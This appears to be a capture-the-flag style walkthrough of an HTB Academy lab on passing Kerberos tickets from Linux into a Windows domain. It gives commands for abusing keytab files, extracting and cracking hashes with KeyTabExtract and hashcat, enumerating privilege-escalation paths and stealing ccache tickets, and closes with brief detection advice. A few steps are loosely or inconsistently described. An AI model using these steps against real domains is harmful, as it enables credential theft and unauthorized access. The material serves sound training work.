# 🛰️ HTB Academy - Pass The Ticket From Linux

## 🔍 Overview
Passing tickets from Linux is a technique that involves exploiting Kerberos tickets to gain unauthorized access and escalate privileges within a Windows domain environment. This lab focuses on using different tools and methods to achieve the objectives outlined in each exercise.

## 🛠️ Objective
The objective of this lab is to perform various Kerberos attacks from a Linux machine, including keytab extraction, ticket abuse, privilege escalation, and cross-platform exploitation. The exercises are designed to teach you how to pass tickets from Linux to gain access to different resources on the target Windows domain.

## 🚀 Initial Access
To begin, establish an initial foothold by SSHing into the Linux machine `LINUX01` using the provided credentials.

```bash
ssh user@ip_address -p 2222
```

### Key Lab Details

#### System Information
- **OS**: Ubuntu x64
- **IP Address**: 10.10.x.y (assigned by your attacker machine)

## 🛠️ Tools Required
Use the following tools for this lab:
- `kinit`: Request Kerberos tickets.
- `klist`: List Kerberos ticket details.
- `KeyTabExtract`: Extract NTLM/AES hashes from keytab files.
- `Linikatz` or similar tool: Perform credential dumping on Linux.

## 🔍 Exercise Walkthrough

### 🛠️ Exercise 1
**Question**: "Check that you can SSH into the machine and run commands as a standard user."

No specific command is needed for this step, but ensure your initial connection works properly. Check system details using:

```bash
uname -a
```

[!SUCCESS] Ensure SSH connectivity and basic shell operations.

---

### 🛠️ Exercise 2
**Question**: "Using the kinit tool, check if you can use a keytab to authenticate as LINUX01$."

Use `kinit` with the computer account principal:

```bash
kinit 'LINUX01$@INLANEFREIGHT.HTB' -k -t /etc/krb5.keytab
```

[!SUCCESS] Verify authentication by listing tickets using `klist`.

---

### 🛠️ Exercise 3
**Question**: "Use KeyTabExtract to extract the NTLM and AES hashes from Carlos' keytab file."

First, find Carlos's keytab file:

```bash
find / -type f -name "*.keytab" 2>/dev/null
```

Extract hashes using `KeyTabExtract`:

```bash
./KeyTabExtract /opt/specialfiles/carlos.keytab > carlos_hashes.txt
```

[!SUCCESS] Ensure the extracted hashes match expected format.

---

### 🛠️ Exercise 4
**Question**: "Use CrackMapExec or any other tool to crack Carlos' keytab file and get the NTLM hash."

Crack the hashes using a password cracker like Hashcat:

```bash
hashcat -m 1000 carlos_hashes.txt rockyou.txt --force
```

[!SUCCESS] Verify cracked NTLM hash.

---

### 🛠️ Exercise 5
**Question**: "Using the Linux user's privilege escalation techniques, gain root access on LINUX01."

Check for SUID binaries or misconfigured sudo rules:

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
```

Exploit any found vulnerabilities to escalate privileges.

[!SUCCESS] Verify root access with `whoami`.

---

### 🛠️ Exercise 6
**Question**: "Find Julio's Kerberos ticket (ccache file) and read the contents of julio.txt."

List `/tmp` for ccache files:

```bash
ls -la /tmp | grep krb5
```

Copy and import the ticket, then access `julio.txt`.

[!SUCCESS] Verify successful retrieval.

---

### 🛠️ Exercise 7
**Question**: "Import Julio's Kerberos ticket (ccache file) and read the contents of julio.txt."

Follow similar steps as in Exercise 6.

[!SUCCESS] Retrieve `julio.txt` content successfully.

---

### 🛠️ Exercise 8
**Question**: "Use LINUX01$'s Kerberos ticket to access \\DC01\linux01 and read the flag file."

Import LINUX01$ ticket:

```bash
kinit 'LINUX01$@INLANEFREIGHT.HTB' -k -t /etc/krb5.keytab
```

Access share and get `flag.txt`.

[!SUCCESS] Retrieve the final flag.

---

## 🛡️ Detection and Defense

### Detection Indicators
Monitor for unusual kinit patterns, file modification times, root privilege escalations, etc.

### Defensive Measures
Restrict keytab permissions, monitor `/tmp`, implement sudo policies, rotate passwords regularly, and use logging tools to track suspicious activities.

---

## 🔗 Related Techniques
Summarize the attack chain steps:
1. Initial access
2. Keytab discovery
3. Hash extraction
4. Lateral movement
5. Privilege escalation
6. Cross-platform attacks

Compare tools like `kinit`, `KeyTabExtract`, `Linikatz`, and `impacket-ticketConverter`.

---

## 📚 References
- **HTB Academy**: Password Attacks - Pass the Ticket from Linux.
- **KeyTabExtract**.
- **Linikatz** by Cisco.
- **Impacket**.
- **Evil-WinRM**.

[!WARNING] Ensure destructive actions are only performed in a controlled lab environment.